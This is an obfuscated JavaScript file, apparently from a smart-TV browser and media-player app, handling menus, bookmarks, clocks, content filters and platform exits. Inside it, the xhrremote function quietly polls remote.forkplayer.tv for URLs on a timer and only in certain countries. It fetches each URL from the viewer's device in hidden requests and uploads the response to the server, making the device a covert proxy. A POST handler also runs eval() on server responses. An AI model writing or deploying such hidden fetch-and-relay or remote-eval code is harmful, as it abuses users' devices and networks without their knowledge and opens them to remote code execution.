Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPCancel_","cmdCancel"));var llO0I111lvwajllII11Ypr="";for(var index=0;index<l0I10IWOIOOO1IYpr;index++){var m_img="";if(gV(Menu[index],4)!="")m_img=Menu[index][4];else if(typeof Menu[index][2]=="string"){if(Menu[index][2]=="cmdMenuSettings")m_img="/insetM"+"enu.png";else if(Menu[index][2]=="cmdSettings")m_img="/settings.png";else if(Menu[index][2]=="cmdExit")m_img="/exit.png";else if(Menu[index][2]=="cmdUp")m_img="/move.png";else if(Menu[index][2]=="cmdRemoteUpdate")m_img=$_("remotesrc").src;else if(Menu[index][2]=="extmedia")m_img="/extmedia.png";else if(Menu[index][2]=="exthtml5")m_img="/exthtml5.png";else if(Menu[index][2]=="cmdGroup")m_img="/group.png";else if(Menu[index][2]=="cmdExtopen")m_img="/extbookm.png";else if(Menu[index][2]=="cmdSetStart")m_img="/cmdSetStart.png";else if(Menu[index][2]=="cmdSorting")m_img="/sort.png";else if(Menu[index][2]=="cmdForkStore")m_img="/exittostore.png";else if(Menu[index][2]=="cmdSearch")m_img="/search.png";else if(Menu[index][2]=="cmdSearchKinopoisk")m_img=""+"/recenzii.png";else if(Menu[index][2]=="cmdMail")m_img="/mail.png";else if(Menu[index][2]=="cmdEdit")m_img="/edit.png";else if(Menu[index][2]=="cmdDonate")m_img="/donate-button.png";else if(Menu[index][2]=="cmdOpenStart")m_img="/b/d.png";else if(Menu[index][2]=="Bookmarks")m_img="/addzakl.png";else if(Menu[index][2]=="cmdReload")m_img="/reload.png";else if(Menu[index][2]=="cmdTranslate")m_img="/translate.png";else if(Menu[index][2].indexOf("cmdDel")==0)m_img="/delete.png";else if(Menu[index][2]=="cmdHistory")m_img="/history.png";else if(Menu[index][2]=="cmdToStart")m_img="/addtostart.png";else if(Menu[index][2]=="cmdSelect"||Menu[index][2]=="cmdSelectAll")m_img="/sele"+"ct_all.png";else if(Menu[index][3]=="vadd")m_img="/addzakl.png";else if(Menu[index][3]=="vdel")m_img="/delete.png";else if(Menu[index][2]=="cmdDelFromStart")m_img="/delete.png";else if(Menu[index][3]=="lock")m_img="/lock.png";else if(Menu[index][3]=="unlock")m_img="/unlock.png";else if(Menu[index][3]=="bookmarks/toolbar")m_img="/addzakl.png";else if(Menu[index][2]==""&&typeof lastBookm.logo_30x30!=undefined)m_img=lastBookm.logo_30x30;else if(Menu[index][2]=="cmdSetIcon"&&Menu[index][3]!="cancel")m_img=Menu[index][3]}
if(gV(Menu[index],5)=="right"||Menu[index][2]=="Bookmarks"||Menu[index][2]=="cmdMoveBookmarks"||Menu[index][2]=="cmdAudio"||Menu[index][2]=="cmdEdit"||Menu[index][2]=="cmdSorting")
var f_img="<img align='right' style='padding-top: "+css_wh(5)+"px; margin-right: "+css_w(-7)+"px;' src='"+_img("_ST_b_f.png")+"' width='"+css_w(21)+"' height='"+css_wh(16)+"' />";else f_img="";if(m_img.indexOf("/")==0)m_img="http://browser.appfxml.com/img"+m_img;if(m_img!="")m_img="<img src='"+_img(m_img)+"' width='"+css_w(21)+"' height='"+css_wh(16)+"' />";else m_img="&nbsp;";if(Menu[index][2]=="cmdForkStore")llO0I111lvwajllII11Ypr+="<div style='height:1px;margin:2px 0px 0px 0px;border-top:1px solid gray;'>&nbsp;</div>";llO0I111lvwajllII11Ypr=llO0I111lvwajllII11Ypr+"<div"+llOlI0OfCMO0l0I0Ypr(1,[" onmousemove=\"l0I10IWOIOOO1IYpr="+index+";kjtYpr.llI0IOruD0IOI1IYprPos(l0I10IWOIOOO1IYpr);\" onclick=\"subMenuEnter();\"",""])+" id='llO0I111lvwajllII11Ypr"+index+"' style='padding:3px 3px 3px 2px;margin:0px;white-space: nowrap;line-height:100%;max-width:600px;overflow:hidden;padding:0px 6px 0px 4px;'><div style='float:left;height: 100%;width:"+css_w(28)+"px;padding-top:0px;'>"+m_img+"</div>"+Menu[index][1]+f_img+"</div>"}
$_("MenuCh").style.width="auto";$_("MenuCh").style.display="block";$_("MenuCh",llO0I111lvwajllII11Ypr);ch_l=290;ch_h=70;if(m=="topmenu")ch_l=$_("kb6").offsetLeft-$_("MenuCh").offsetWidth-1;else if(m=="favmenu")ch_l=$_("kb5").offsetLeft-$_("MenuCh").offsetWidth-1;else if(getSelect()==-1){ch_h=25;ch_l=$_(oInset.allI()[insetSelect]).offsetLeft}else if(getSelect()<0){ch_h=73;ch_l=100+sdbarSel*100}else{ch_h=$_("site").offsetTop+$_("ch"+getSelect()).offsetTop-$_("scrollsite").scrollTop+20;if(ch_h+$("#MenuCh").height()>$("#site").height()){ch_h=$("#site").height()-$("#MenuCh").height()-20}
ch_l=$_("ch"+getSelect()).offsetLeft+($_("ch"+getSelect()).offsetWidth/2);if((ch_l+40+$("#MenuCh").width())>$("#site").width())ch_l=$("#site").width()-$("#MenuCh").width()-40}
if(ch_l<0)ch_l=0;if(ch_h<10)ch_h=10;$_("MenuCh").style.top=ch_h+"px";$_("MenuCh").style.left=Math.ceil(ch_l)+"px";$_("MenuCh").style.borderRadius="0px";$_("MenuCh").style.overflowY="auto";$_("MenuCh").style.maxHeight="90%";handler="context";kjtYpr.llI0IOruD0IOI1IYprPos(0)};kjtYpr.llI0IOruD0IOI1IYprPos=function(n,mode){if(subMenu.length){if(mode){subl0I10IWOIOOO1IYpr=n;if(subl0I10IWOIOOO1IYpr<0)subl0I10IWOIOOO1IYpr=subMenu.length-1;if(subl0I10IWOIOOO1IYpr>(subMenu.length-1))subl0I10IWOIOOO1IYpr=0;for(var index=0;index<subMenu.length;index++){if(index==subl0I10IWOIOOO1IYpr)
$_("subllO0I111lvwajllII11Ypr"+index).style.backgroundColor="#4281F4";else $_("subllO0I111lvwajllII11Ypr"+index).style.backgroundColor="transparent"}
return}else{if(submenuParent!=l0I10IWOIOOO1IYpr)closeSubMenu();else return}}
l0I10IWOIOOO1IYpr=n;if(l0I10IWOIOOO1IYpr<0)l0I10IWOIOOO1IYpr=Menu.length-1;if(l0I10IWOIOOO1IYpr>(Menu.length-1))l0I10IWOIOOO1IYpr=0;for(var index=0;index<Menu.length;index++){if(index==l0I10IWOIOOO1IYpr){$_("llO0I111lvwajllII11Ypr"+index).style.backgroundColor="#4281F4"}else{$_("llO0I111lvwajllII11Ypr"+index).style.backgroundColor="transparent"}}
var tmp=$_("site").offsetTop;tocroll($_("MenuCh"),$_("llO0I111lvwajllII11Ypr"+l0I10IWOIOOO1IYpr));$_("site").offsetTop=tmp};function tocroll(p,c){var ch_pos=c.offsetTop-p.scrollTop;var site_bot=p.offsetHeight;var y_t=Math.ceil(c.offsetTop-site_bot*0.18);var y_b=Math.ceil(c.offsetTop+c.offsetHeight-site_bot*0.87);if(y_t<p.scrollTop){p.scrollTop=y_t}else if(y_b>p.scrollTop)p.scrollTop=y_b}
function getbut(id,img,url,text){html="<div class='btextss' id='dbt"+id+"' style='float:left;'"+(text==""?"display:none;":"")+llOlI0OfCMO0l0I0Ypr(1,[" onclick=\""+url+"\"",""])+"><img id='but"+id+"' style='margin-top:2px; padding-left:"+css_w(12)+"px;width:16px; height:16px;' src='"+_img(img)+"' />";html+="<span id='bt"+id+"' style=''>"+text+"</span>";html+="</div>";return html}
function tmf(){clearTimeout(np_timer);if(maJor.platform()=="tizen")keyHandler({"keycode":10009,"preventDefault":function(){}});else keyHandler({"keycode":VK_BACK,"preventDefault":function(){}})}
var goBack=!1,norek=!1;function gotoStart(){try{IlO11lQ0().navigate("about:blank");kjtYpr.Password=""}catch(e){kjtYpr.popUp("Err open START menu:<br>"+e.message,5000)}}
function l11IIXTU1u1l1llIYpr(url,mode){try{url=IlO11lQ0().get("url");if(url.indexOf("no_save")>0||url=="submenu")return 0;if(mode||version_local_js){var n_start=9,n_per=9,n_zakl=9,j=0;for(var i=IlO11lQ0().history.length-1;i>-1;i--){if(l0O0l0111mJXG1OII1OYpr(IlO11lQ0().history[i].url)&&n_start==9)n_start=j;if(IlO11lQ0().history[i].title=="_FPPerPoAdr_"&&n_per==9)n_per=j;if((IlO11lQ0().history[i].url.indexOf("bookmarks")==0||IlO11lQ0().history[i].url.indexOf("zakladki")==0)&&n_zakl==9)n_zakl=j;j++}
if(n_start<5||n_per<3||n_zakl<3||mode){if(n_start==0||n_per==0||n_zakl==0)return 0;var savePrev=l0OIIlIIlONuu1111Ypr(maJor.read("prev_cache"));if(savePrev==null)savePrev={};if(typeof prev[url].setcache!="undefined")if(prev[url].setcache!=""){kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> Эта страница была загружена с кеша и может содержать устаревшие данные! Проверьте наличие интернет соединения или возможно страница была перемещена по новому адресу!",2200);return 0}
savePrev[url]={"setimg":IlO11lQ0().get("img"),"settitle":IlO11lQ0().get("title"),"typeList":prev[url].typeList,"setcache":Math.ceil(T.inetTime/1000),"channels":prev[url].channels,"url":url};maJor.write("prev_cache",ll1lI1lI0sl0OlIYpr(savePrev))}}
return 1}catch(e){}}
function nohtml(){kjtYpr.l11II0OI1JuTullll0Ypr("media")}
var rCook=new RegExp("^https?://(www\.|m\.|p\.lnka\.ru/|fxmlparsers\.ru/)?(https?://)?(.*?)(:|\\?|/|$|#)");var pl_serv=0,pl_count=1;var flashmode=null,lastmode=null,is_rek=!1,rek_mode;var handmode=null;function getmode(url){if(url==null)url="";var m;if(handmode!=null)m=handmode;else{}
if(maJor.platform()=="maple"&&m!="jw")m="media";return m}
function is_xxx(n,n2){if(typeof n=="object"){if(gV(n,"title")==""&&typeof n[0]=="undefined")return 0;for(var i in n){if(is_xxx(n[i]))return 1}
return 0}
if(n2!=null)if(n2!="")n=n2;if(n==null)n="";if(typeof n!='string')return 0;n=n.split("#POST")[0];if(n.match(/^(cmd:)/))return 0;if(n.match(/(http:|\/\/)/)){if(n.match(/(18_plus|18plus|porn| ххх | ххх$|^xxx | sex |sex |adult|\.sisi\.am)/i))return 1;else return 0}
if(n.match(/(русская ночь|18plus|playboy|creampi|compilati|18_plus|18\+|porn|hustler| ххх | ххх$|^xxx | sex |sex |adult| anal|pron|masturb|порно|секс| анал|мастурб|минет|эротика|brazzers)/i))return 1;return 0}
function is_parse_self(u1,u2){var dm=u1.match(/^https?:\/\/(.*?)(:|\?|\/|$)/);if(dm!=null){dm2=u2.match(/^https?:\/\/(.*?)(:|\?|\/|$)/);if(dm2!=null)if(dm[1]==dm2[1])return 1}
return 0}
function is_local(url){if(url.match(/^(\/|usb:\/\/)/))return!0;if(url.match(/^http:\/\/(127\.|^10\.|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-1]\.|^192\.168\.)/))return!0;if(url.match(/(\/treeview|:45397\/|:8027\/|:8028\/|\/parserlink|\/smarttv\/acestream\.php)/))return!0;var ip="";if(maJor.params.get("acestream")!="")ip=maJor.params.get("acestream").split(":")[0];if(maJor.params.get("remoteip")!="")ip=maJor.params.get("remoteip").split(":")[0];if(ip!="")if(url.indexOf("http://"+ip)==0)return!0;return!1}
function is_directly(url,wp){if(is_local(url)||wp==-2||url.match(/(alexkdpulg\.php|mylist\.obovse\.ru|obovse.ru\/smarttv)/))return!0;return!1}
function fromSpider(){var res=!1;if(gP("lII1I1PVBuI1lIlYpr").indexOf("http")!=0||gP("lII1I1PVBuI1lIlYpr").indexOf("http://cloudflare.appinfo.su/browseraccount")==0||gP("lII1I1PVBuI1lIlYpr").indexOf("alexkdpulg.php?bylist=")>0)return!1;for(i=IlO11lQ0().history.length-1;i>=0;i--){try{var url=IlO11lQ0().history[i].url;var t=IlO11lQ0().history[i].title;if(url=="mylist"||url=="favorites"||t.indexOf("_FPPerPoAdr_")==0)return!1;if(url.indexOf("http://spiderxml.com/top")==0){return!0}
if(l0O0l0111mJXG1OII1OYpr(url)){break}}catch(e){}}
return res}
function is_white(n){n=n||Ill001("lII1I1PVBuI1lIlYpr")||gP("lII1I1PVBuI1lIlYpr");if(!n)return 0;if(is_xxx(curCh()))return 0;if(n=="about:settings"||n.indexOf("vk_audio")>0)return 1;var isx=0,iso=0;for(i=IlO11lQ0().history.length-1;i>=0;i--){try{var url=IlO11lQ0().history[i].url;var t=IlO11lQ0().history[i].title;if(l0O0l0111mJXG1OII1OYpr(url)||url.indexOf("http")!=0){break}
if(is_xxx(url)||is_xxx(t)){isx=1}}catch(e){}}
if(!isx)return 1;return 0}
function is_m3u8(url){url=url||vPlayer.playUrl;if(!url)return 0;if(curCh("type")=="vod")return 0;if(curCh("type")=="hls")return 2;if(url.match(/\.(flv|mp4|mkv|avi|3gp|m2t|m2ts|mov|mpg|mpeg|ts).{0,1}$/)){return 0}
if(url.match(/\.m3u8/)){return 2}
if(gP().global.is_iptv===!0||gP().global.is_iptv=="true"||gP().global.is_iptv>0)return 1;if(url.indexOf("proxym3u8")>0)return 2;if(url.indexOf("ace/getstream")>0)return 0;if(url.indexOf(":8027")>0)return 0;if((url.indexOf("j.mp")>0&&gP().is_iptv>2))return 2;else if(url.indexOf("/chtst")>0||url.indexOf("/udp")>0||url.indexOf("/hls")>0)return 1;else if(gP("lII1I1PVBuI1lIlYpr").indexOf(".m3u")>0&&url.indexOf("iptv")>0)return 1;else return 0}
function olI11lQ1OhFv1II1Ypr(url){IlO11lQ0().navigate(url)}
var countHw=1.4;var user=null;var lastBookm={"url":""},rt_obj=null;function xhr_bookmark(u,cmd,str,count,request_id){var data={"channels":[]};s=maJor.read("bookmarks");var sd=[];if(s!=""){sd=l0OIIlIIlONuu1111Ypr(s);if(sd==null)sd=[];if(typeof sd.push=="undefined")sd=[]}
if(u.match(/^(zakladki)/)){if(gV(cmd)=="update")maJor.write(u,ll1lI1lI0sl0OlIYpr(str));s=maJor.read(u);var d=l0OIIlIIlONuu1111Ypr(s);if(d!=null)if(typeof d.channels!="undefined")data.channels=d.channels}else if(u=="bookmarksadd"){var n=sd.length+1;data.channels.push({"logo_30x30":_img("_ST_1px.png"),"title":"<"+"Избранное "+n+">","value":"Избранное "+n,"search_on":"_FPName_:","playlist_url":"payd_name"});data.channels.push({"logo_30x30":_img("_ST_ok.png"),"value":"","title":"_FPPodtverdit_","playlist_url":"bookmarksaddok","description":""})}else if(u=="bookmarksaddok"){if(gP().input&&gP().input.name){sd.push({"title":gP().input.name,"type":"dir","playlist_url":"bookmarks/"+(sd.length+1)});maJor.write("bookmarks",ll1lI1lI0sl0OlIYpr(sd));return{"cmd":"historyback(1);reload();","channels":[{"title":"Add OK"}]}}else kjtYpr.inf("Empty name ",1500)}else{if(u.indexOf("bookmarks/extbookm")==0){olI11lQ1OhFv1II1Ypr("http://cloudflare.appfxml.com/browseraccount/?do=extbookm&v=get&dir="+u);return}
if(u.indexOf("bookmarks/addext")==0){var url="bookm="+encodeURIComponent(ll1lI1lI0sl0OlIYpr(str));lastBookm.url=u;lastBookm.title="_FPVneshnie_ _FPzakladki_ "+u.substring(16);lastBookm.logo_30x30=_img("_ST_b_c.png");uHelper.create("directnoheader").getI("http://cloudflare.appfxml.com/browseraccount/?do=extbookm&dir="+u+"&v=add&"+url).parse=function(s){kjtYpr.inf(l0OIIlIIlONuu1111Ypr(s)["channels"][0].title,1500)};return}
if(u=="bookmarks/addnew"){u="bookmarks/"+(sd.length+1);kjtYpr.inf("Создана папка "+"Избранное "+(sd.length+1),1000);sd.push({"title":"Избранное "+(sd.length+1),"type":"dir","playlist_url":"bookmarks/"+(sd.length+1)});maJor.write("bookmarks",ll1lI1lI0sl0OlIYpr(sd));kjtYpr.llI0IOruD0IOI1IYprPlay("",u);return}
if(u=="bookmarks/toolbar"){if(maJor.params.get("sidebar")!="1"){rt_obj=str;confirmed.create("Отключено в Настройках. Включить?","_FPBookmark toolbar_").fun0=function(){maJor.params.set("sidebar",1);xhr_bookmark("bookmarks/toolbar","add",rt_obj);gP().l11l0IfeO110IOYpr()}
return}
var exs=!1;for(var i=0;i<sd.length;i++){if(sd[i].playlist_url==u)exs=!0}
if(!exs){kjtYpr.inf("Создана папка "+"_FPBookmark toolbar_",1000);sd.push({"title":"_FPBookmark toolbar_","type":"dir","playlist_url":"bookmarks/toolbar"});maJor.write("bookmarks",ll1lI1lI0sl0OlIYpr(sd))}}
for(var i=0;i<sd.length;i++){if(sd[i].playlist_url==u){if(typeof(sd[i].channels)=="undefined")sd[i].channels=[];if(cmd!=null){if(cmd=="update"){sd[i].channels=str.channels;maJor.write("bookmarks",ll1lI1lI0sl0OlIYpr(sd));return sd[i]}else if(cmd=="count")return sd[i].channels.length
else if(cmd=="cmdRename"){sd[i].title=str}else if(cmd=="cmdUrlIcon"){sd[i].logo_30x30=str}else if(cmd=="cmdSetIcon"){sd[i].logo_30x30=str;olI11lQ1OhFv1II1Ypr("about:bookmarks");setSelect(0)}else if(cmd=="add"){sd[i].channels.unshift(str);maJor.write("bookmarks",ll1lI1lI0sl0OlIYpr(sd));if(u!="bookmarks/toolbar"){lastBookm.url=u;lastBookm.title=sd[i].title;if(typeof sd[i].logo_30x30=="undefined")lastBookm.logo_30x30="";else lastBookm.logo_30x30=sd[i].logo_30x30}else{sdbar=null;sidebar_show()}
kjtYpr.inf("_FPDobavlenoV_ "+sd[i].title,1000);return}else if(cmd=="cmdDel"){if(str==-2)str=sdbarSel;sd[i].channels.splice(str,1);kjtYpr.inf("Удалено!",1000);if(getSelect()>0)setSelect("--")}else if(cmd=="alldel"){sd.splice(i,1);kjtYpr.inf("Папка удалена!",1000);if(getSelect()>0)setSelect("--")}else if(cmd=="bookmarkRename"){sd[i].channels[select].title=str}
maJor.write("bookmarks",ll1lI1lI0sl0OlIYpr(sd));if(u=="bookmarks/toolbar"){sdbar=null;sidebar_show()}
if(getSelect()>=0){IlO11lQ0().reload()}
return}
data.channels=sd[i].channels;break}}}
data.channels=delNull(data.channels);if(data.channels.length==0){kjtYpr.inf("_FPZdesPusto_!",1000);return data}
return data}
function delNull(o){for(var i=0;i<o.length;i++){if(o[i]==null||typeof o[i]=="undefined"){o.splice(i,1);i--}}
return o}
function llI111O0hn01IO1QIYpr(){try{var len=0,free=0,after=0;for(var key in localStorage){if(key.indexOf("enteres")!=-1||key.indexOf("xml")!=-1||key.indexOf("settings")!=-1||key.indexOf("url")!=-1||key.indexOf("search")!=-1)continue;else{localStorage.removeItem(key)}}
setTimeout("kjtYpr.inf('Clear localStorage');",1000)}catch(e){}}
var dataconfirm;var favarray=null;var blic=!0,dd1=0;var licdata,licsel,licok=!1,redir=0,pltags=["title","stream_url","stream_url2","logo_30x30","description","category","category_id","playlist_url","playlist_url2","parser","mb_parser","menu_url","search_on","presearch","menu","buffer","ibuffer","jtvname","tvg-shift","value","group","chat","subtitles","yellow_url","yellow_title","yellow_parser","infolink","location","vast","type","SetTimeInterval"];var plgltags=["playlist_name","align","navigate","options","title","icon","url","server","next_page_url","prev_page_url","cacheinfo","setcache","cachetime","access","typeList","player","timeout","is_iptv","all_local","all_description","background-image","background_image","color","pageinfo","menu","style","location","setcookie","before","allvast","footer","url_tvg","info"];var l1IO1lzlVJI1Oll0Ypr=null,listTimer=null,xhr=null,xhr2=null,xhr_abort=!1,is_type="",POST_S="",waitc={};function ord_id(){var x=gP("lII1I1PVBuI1lIlYpr").replace(/device_id.*?&/i,"").replace(/device_token.*?&/i,"");var nm=md5(x);return nm}
function reordered(ch){if(ordered==null){var s=maJor.read("ordered");if(s=="")ordered={};else ordered=l0OIIlIIlONuu1111Ypr(s);if(ordered==null)ordered={}}
var nm=ord_id();if(typeof ordered[nm]!="undefined"){var chs=[];for(var k in ordered[nm]){if(ordered[nm].hasOwnProperty(k)){ch[k].order=ordered[nm][k];ch[k].del=1;chs.push(ch[k])}}
for(var index=0;index<ch.length;index++){if(ch[index].del==1){ch.splice(index,1);index--;continue}}
chs.sort(function(a,b){return a.order-b.order});for(var index=0;index<chs.length;index++){if(chs[index].order>0)ch.unshift(chs[index]);else ch.push(chs[index])}}
return ch}
function hint(s,m){if($_("popUp").style.display=="block")$_("popUp").style.display="none";if($_("hint")!=null)$("#hint").remove();var div=document.createElement('div');div.id="hint";div.style.position="absolute";div.style.textAlign="left";div.style.padding="4px";div.style.borderRadius="8px";div.style.borderTopRightRadius="0px";div.style.marginTop="-14px";div.style.background="rgb(98, 100, 100)";div.style.border="1px solid #767676";div.style.fontSize="75%";div.style.zIndex="2";div.style.maxWidth="400px";div.style.marginLeft="-400px";$_(m).appendChild(div);$_("hint",s);$_("hint").style.marginLeft="-"+($_("hint").offsetWidth-10)+"px";setTimeout('$("#hint").remove();',7000)}
kjtYpr.popUp=maJor.popUp;kjtYpr.inf=maJor.inf;var T={s:0,m:0,h:0,day:0,date:0,month:0,year:0,inetTime:0,delta:0,y_t_days:0,Sync_step:0,timezone:0,offset:new Date().getTimezoneOffset(),summertime:(new Date().getTimezoneOffset()-new Date(2011,0,11).getTimezoneOffset())/60,timestamp:0};function getDT(t){try{var timesec=new Date(parseInt(t));T.year=timesec.getFullYear();T.date=timesec.getDate();T.month=timesec.getMonth();T.day=timesec.getDay();T.h=timesec.getHours();T.m=timesec.getMinutes();T.s=timesec.getSeconds()}catch(e){}};function SetTimeDate(){if(!T.inetTime)return;T.timestamp+=1;T.inetTime+=1000;if(handler=="iframe")return;getDT(T.inetTime+maJor.params.get("JTVRegion")*3600000);nkh=0;var dstring=to(T.h,T.m,T.s,0);if(!$_('widget_time'))return;if($_('widget_time').innerHTML!="&nbsp;")$_('widget_time',dstring);try{if(handler=='player'||handler=='qual'||vPlayer.is_mini()||maJor.params.get('scrsaver')<1||minimize||isScreensaver||$_("main").style.display=="none")screensavertimer=-1;else{if(screensavertimer==-1)screensavertimer=T.inetTime;else if(T.inetTime-screensavertimer>185000)screensavertimer=-1;else if(T.inetTime-screensavertimer>180000)screensaver(!0)}
if(vPlayer.played()||vPlayer.audio.played()){vPlayer.getVideoPlayInfo();if(!vPlayer.audio.played()){if(info_mode==3||info_mode==4)dstring=dstring.substring(0,dstring.length-3);if($_("player_time")!=null)$_('player_time',dstring)}}}catch(e){}
var dday=['_FPSunday_','_FPMonday_','_FPTuesday_','_FPWednesday_','_FPThursday_','_FPFriday_','_FPSaturday_'];var dmon=['_FPJanuary_','_FPFebruary_','_FPMarch_','_FPApril_','_FPMay_','_FPJune_','_FPJule_','_FPAugust_','_FPSeptember_','_FPOctober_','_FPNovember_','_FPDecember_'];$_('widget_date',dday[T.day]+', '+T.date+' '+dmon[T.month]);var n=Math.floor(T.inetTime/1000);if(n%2800==10)selfpages={};if((n%180==10&&handler=="menu")||n%1980==10){if(maJor.params.get("remote"))maJor.Remote.init()}
if(getSelect()<0)var st=0;else st=getSelect();if(IlO11lQ0()&&gP()&&gP().channels.length&&gP().channels[st].SetTimeInterval){var o=gP().channels[st].SetTimeInterval;if(n%(60*o.time)==10){if(handler=="player")var u=gV(o,"onplay");else u=gV(o,"onmenu");if(u.indexOf("http")==0){uHelper.create("directnoheader").getI(u).parse=function(s){if(s){if(s.indexOf("}")>0){if(gV(l0OIIlIIlONuu1111Ypr(s),"message")&&handler!="player")kjtYpr.inf(x.message,1200)}}}}}}};var doprf1="",doprf2="",remoteXhr2=null,remoteXhr=null,acestream=!1,prxremote="http://remote.forkplayer.tv/smarttv/api.php";function getip(t,nop){var ip=maJor.params.get(t)||maJor.params.get("remoteip").split(":")[0]||"127.0.0.1";if(ip.indexOf(":")==-1){if(t=="acestream")ip+=":6878";else if(t=="torrserve")ip+=":8090"}
if(nop)return ip.split(":")[0];else return ip}
var torver="";function trylink(s){s=gV(s);if(s.indexOf("ACE_PORT")>0)s=s.replace(/ACE_PORT/g,getip("acestream").split(":")[1]);if(s.indexOf("LOCAL_PORT")>0){if(maJor.params.get("remoteip")=="")kjtYpr.inf("Установите значение Remote Fork в Настройках!",2000);s=s.replace(/LOCAL_PORT/g,maJor.params.get("remoteip").split(":")[1])}
if(s.indexOf("LOCAL_IP")>0){if(maJor.params.get("remoteip")==""){kjtYpr.inf("Установите значение Remote Fork в Настройках!",2000);s=s.replace(/LOCAL_IP/g,"127.0.0.1")}else s=s.replace(/LOCAL_IP/g,maJor.params.get("remoteip").split(":")[0])}
if(s.indexOf("ACE_IP")>0)s=s.replace(/(MB_)?ACE_IP/g,getip("acestream",!0));if(s.indexOf("TORRSERVE_IP")>0)s=s.replace(/TORRSERVE_IP/g,getip("torrserve",!0));return s}
var rf_ver=0;function to(_0xf8efx6b,_0xf8efx6c,Seconds,_0xf8efxc){return(_0xf8efx6b>9?_0xf8efx6b:('0'+_0xf8efx6b))+':'+(_0xf8efx6c>9?_0xf8efx6c:('0'+_0xf8efx6c))+((Seconds!=null)?(':'+(Seconds>9?Seconds:('0'+Seconds))):'')};function to2(sec){if(isNaN(sec)||sec==Infinity)return"∞";var s=" 0"+(sec%60);m=Math.floor(sec/60);return m+":"+s.substr(s.length-2)}
function closeapp(){try{if(maJor.platform()=="mag"){window.location=resolution_portal}else if(maJor.platform()=="dune"){window.location=resolution_portal}else if(maJor.platform()=="maple")widgetAPI.sendReturnEvent();else if(maJor.platform()=="tizen")tizen.application.getCurrentApplication().exit();else if(maJor.platform()=="android-device")andr.cmd("exit");else if(typeof window.NetCastExit!="undefined")window.NetCastExit();else{try{webOS.platformBack()}catch(e){}
window.close()}}catch(e){}}
function lI0O1IIlOVhl10II1lYprPost(url,p,mode,request_id){var xhrt=null;xhrt=new XMLHttpRequest();xhrt.onreadystatechange=function(){if(xhrt.readyState==4){statusbar("off");if(mode=="xmltv"){try{eval(xhrt.responseText)}catch(e){statusbar(xhrt.responseText.substr(0,140))}}else if(mode=="translatepage"){var data=l0OIIlIIlONuu1111Ypr(xhrt.responseText);if(data.code=='404'){kjtYpr.popUp(data.message,1500)}else{var j=0;var curPage=gP();IlO11lQ0().put("title",data[j++]);for(var i=0;i<curPage.channels.length;i++){curPage.channels[i].title=data[j++];curPage.channels[i].description=data[j++]}}
IlO11lQ0().focused()}}};xhrt.open('POST',url,!0);xhrt.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhrt.send(p)}
rTime1=30;rTime2=1150;var timerremote=setTimeout("xhrremote();",rTime1*1000);function is_onRemote(m){if(maJor.params.get("remote")>=2&&maJor.params.get("remoteactive")){if(m==null||maJor.params.get("remoteip").match(/\d+\.\d+:802(7|8)/))return 1}
return 0}
function xhrremote(){var request_id=-1;if(maJor.platform()=="maple"&&handler!="menu")return;if(!ipCountry.match(/UA|RU|BY|NL/))return;if(!is_loadpage()&&(maJor.app_cors||is_onRemote(1))){var type="";if(is_onRemote(1)){rTime2=150;if(maJor.params.get("remoteip").match(/:8027/))type="curl_windows";else if(maJor.params.get("remoteip").match(/:8028/))type="curl_androind"}else if(maJor.app_cors){rTime2=500;if(maJor.platform()=="android-device"){if((maJor.build>=5.1&&maJor.build<5.6)||maJor.build>=6.0){type=maJor.platform();rTime2=250}else return}else if(xhr_referer==1||xhr_referer==2){type="referer";rTime2=1500}else if(maJor.loader_platform=="lg_webos"){type="lg_webos_ide";rTime2=1500}else if(maJor.loader_platform=="lg_netcast"){type="lg_netcast";rTime2=1500}else if(maJor.series=="D"||maJor.series=="C"){type="sams_d";rTime2=1500}else if(xhr_referer==3){type=maJor.platform();rTime2=250}else if(xhr_referer==0){type=maJor.platform()+"|no_referer";rTime2=1200}}else type="null";uHelper.create("directnoheader").hid().get("http://remote.forkplayer.tv/smarttv/api.php?plat"+"form="+maJor.platform()+"&build="+maJor.build+"&xhr_referer="+xhr_referer+"&type="+type+"&do=xhrremote2&rf_ver="+rf_ver+"&version=14&v=get&country="+ipCountry).parse=function(s){var allx=s.split("\n");if(allx.length>2)x=allx[_.random(0,allx.length-1)];else x=s.split("\n")[0];if(x.indexOf("http")!=0&&x.indexOf("curl")!=0)return;var rfxhr=null
if(is_onRemote(1))rfxhr=uHelper.create("rf");else if(maJor.platform()=="android-device"||(maJor.app_cors&&x.indexOf("curl")!=0))rfxhr=uHelper.create("direct");if(rfxhr!=null){rfxhr.hidden=1;rfxhr.mobile=0;rfxhr.parse=function(s){if(s!=null&&s.length>10&&s.indexOf("Error:")!=0){uHelper.create("directnoheader").hid().get("http://remote.forkplayer.tv/smarttv/api.php?rf_ver="+rf_ver+"&xhr_referer="+xhr_referer+"&country="+ipCountry+"&type="+type+"&plat"+"form="+maJor.platform()+"&do=xhrremote2&v=post&u="+encodeURIComponent(x)+"#POSTs="+encodeURIComponent(s)).parse=function(s){}}}
rfxhr.get(x)}}}
clearTimeout(timerremote);timerremote=setTimeout("xhrremote();",rTime2*1000)}
function l1Il110z0S1OI0I1Ypr(s){data=[];var lQ10lsuK1l111Ypr=s.replace(/\r/g,"").split('\n');for(var index=0;index<lQ10lsuK1l111Ypr.length;index++){data.push({"title":lQ10lsuK1l111Ypr[index].split("/")[lQ10lsuK1l111Ypr[index].split("/").length-1],"stream_url":lQ10lsuK1l111Ypr[index],description:lQ10lsuK1l111Ypr[index]})}
return data}
function lIllllIF1l0O1I1IYprParams(data){var result={};var REGEX_PARAMS=new RegExp("\s*(\"([^\"]+)\"|([^=]+))=(\"([^\"]+)\"|(\S+))","g");var m,key,value;while((m=REGEX_PARAMS.exec(data))!==null){if(m.index===REGEX_PARAMS.lastIndex){REGEX_PARAMS.lastIndex++}
key=trim2(m[2]||m[3]||"");value=m[5]||m[6];if(key)result[key]=value}
return result}
